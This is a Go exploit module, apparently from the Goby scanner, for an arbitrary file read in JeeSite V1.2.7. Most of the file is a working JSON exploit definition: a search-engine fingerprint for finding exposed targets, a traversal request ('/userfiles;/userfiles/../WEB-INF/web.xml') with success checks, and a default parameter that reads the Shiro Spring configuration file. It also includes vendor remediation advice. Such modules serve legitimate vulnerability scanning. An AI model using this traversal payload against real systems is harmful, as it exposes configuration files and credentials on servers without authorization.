package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JEESITE V1.2.7 File Read",
    "Description": "<p>JeeSite is a high-efficiency, high-performance, and strong security open source Java EE rapid development platform based on a number of excellent open source projects, highly integrated and packaged.</p><p>In JeeSite 1.x version, the UserfilesDownloadServlet function improperly handles the related URL, which leads to the existence of arbitrary file reading vulnerabilities.</p>",
    "Impact": "JEESITE V1.2.7 File Read",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://jeesite.com\">https://jeesite.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "JeeSite",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "JEESITE 快速开发平台 V1.2.7版本任意文件读取漏洞",
            "Description": "<p><span style=\"font-size: 16.96px;\"></span><span style=\"font-size: 16.96px;\">JeeSite是基于多个优秀的开源项目，高度整合封装而成的高效，高性能，强安全性的开源Java EE快速开发平台。在<span style=\"color: rgb(22, 51, 102); font-size: 16.96px;\">JeeSite 1.x版本中由于<span style=\"color: rgb(66, 66, 66); font-size: 16px;\">UserfilesDownloadServlet函数对相关URL处理不当，导致其存在</span>任意文件读取漏洞。</span></span></p>",
            "Impact": "<p>攻击者读取任意文件，导致系统敏感配置文件泄露，进而导致数据库密码或者敏感文件泄露，影响用户数据等风险。</p>",
            "Recommendation": "<p>1、更新至4.x版本，官方地址：</p><p><a href=\"https://jeesite.com/\" rel=\"nofollow\">https://jeesite.com/</a><br></p><p>2、临时解决方案，建议使用WAF进行过滤，安装参考：</p><p><a href=\"https://github.com/SpiderLabs/ModSecurity/wiki\" rel=\"nofollow\">https://github.com/SpiderLabs/ModSecurity/wiki</a></p>",
            "Product": "JeeSite",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "JEESITE V1.2.7 File Read",
            "Description": "<p>JeeSite is a high-efficiency, high-performance, and strong security open source Java EE rapid development platform based on a number of excellent open source projects, highly integrated and packaged.</p><p>In JeeSite 1.x version, the UserfilesDownloadServlet function improperly handles the related URL, which leads to the existence of arbitrary file reading vulnerabilities.</p>",
            "Impact": "JEESITE V1.2.7 File Read",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://jeesite.com\">https://jeesite.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "JeeSite",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "(body=\"jeesite.css\" && body=\"jeesite.js\" && body=\"jeesite.com\")",
    "GobyQuery": "(body=\"jeesite.css\" && body=\"jeesite.js\" && body=\"jeesite.com\")",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "https://jeesite.com/",
    "DisclosureDate": "2021-10-24",
    "References": [
        "http://www.yulegeyu.com/2021/06/19/JEESITE-V1-2-7-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/userfiles;/userfiles/../WEB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<display-name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<listener-class>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/userfiles;/userfiles/../WEB-INF/web.xml",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<display-name>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<listener-class>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../WEB-INF/classes/spring-context-shiro.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
